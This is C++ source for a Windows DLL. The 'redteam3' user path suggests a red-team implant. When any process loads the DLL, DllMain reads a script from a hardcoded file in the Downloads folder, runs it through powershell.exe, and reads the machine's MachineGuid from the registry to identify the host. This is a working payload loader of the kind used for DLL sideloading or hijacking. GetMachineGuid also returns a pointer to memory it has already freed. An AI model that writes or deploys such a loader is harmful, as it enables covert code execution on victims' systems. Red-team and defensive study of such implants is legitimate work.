#include "pch.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <Windows.h>

using namespace std;

namespace PowerShellExecutorLibrary {
    class PowerShellExecutor {
    public:
        void ExecuteScriptFromFile(string scriptFilePath) {
            // 读取文件内容
            string command = ReadFileContents(scriptFilePath);
            if (command.empty()) {
                cerr << "Failed to read PowerShell script from file." << endl;
                return;
            }

            // 构建 PowerShell 命令
            wstring powershellCmd = L"powershell.exe -Command \"" + StringToWide(command) + L"\"";

            // 将命令转换为可修改的缓冲区
            wchar_t cmdBuffer[100000]; // 足够大来保存命令
            wcscpy_s(cmdBuffer, powershellCmd.c_str());

            // 创建进程
            STARTUPINFO si = {};
            PROCESS_INFORMATION pi = {};
            si.cb = sizeof(si);

            if (!CreateProcess(NULL, cmdBuffer, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                cerr << "Failed to execute PowerShell command." << endl;
                return;
            }

            // 等待进程结束
            WaitForSingleObject(pi.hProcess, INFINITE);

            // 关闭进程和线程句柄
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            cout << "PowerShell command executed successfully." << endl;
        }

    private:
        string ReadFileContents(string filePath) {
            ifstream file(filePath);
            if (!file) {
                cerr << "Failed to open file: " << filePath << endl;
                return "";
            }

            stringstream buffer;
            buffer << file.rdbuf();
            return buffer.str();
        }

        wstring StringToWide(const string& str) {
            int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
            wstring wide_str(size_needed, 0);
            MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wide_str[0], size_needed);
            return wide_str;
        }
    };

    // Define EntryPointImpl function
    extern "C" __declspec(dllexport) void EntryPointImpl() {
        PowerShellExecutor executor;
        // 在这里传入要执行的 PowerShell 脚本文件路径
        string scriptPath = "C:\\Users\\redteam3\\Downloads\\t.tmp";
        executor.ExecuteScriptFromFile(scriptPath);
    }
}

extern "C" __declspec(dllexport) const char* GetMachineGuid() {
    HKEY hKey;
    const char* result = "Unable to retrieve MachineGuid";
    DWORD bufferSize = 0;
    BYTE* buffer = nullptr;

    // 開啟註冊表中的 MachineGuid 鍵
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        // 查詢 MachineGuid 的大小
        if (RegQueryValueExA(hKey, "MachineGuid", nullptr, nullptr, nullptr, &bufferSize) == ERROR_SUCCESS) {
            // 分配足夠大小的緩衝區來存儲 MachineGuid
            buffer = new BYTE[bufferSize];

            // 讀取 MachineGuid
            if (RegQueryValueExA(hKey, "MachineGuid", nullptr, nullptr, buffer, &bufferSize) == ERROR_SUCCESS) {
                // 將字節數組轉換為字符串
                result = (const char*)buffer;
            }

            // 清理資源
            delete[] buffer;
        }

        // 關閉註冊表鍵
        RegCloseKey(hKey);
    }

    return result;
}

// Define DllMain function
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        GetMachineGuid();
        PowerShellExecutorLibrary::EntryPointImpl();
        break;
    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    }
    return TRUE; // Successful DLL_PROCESS_ATTACH.
}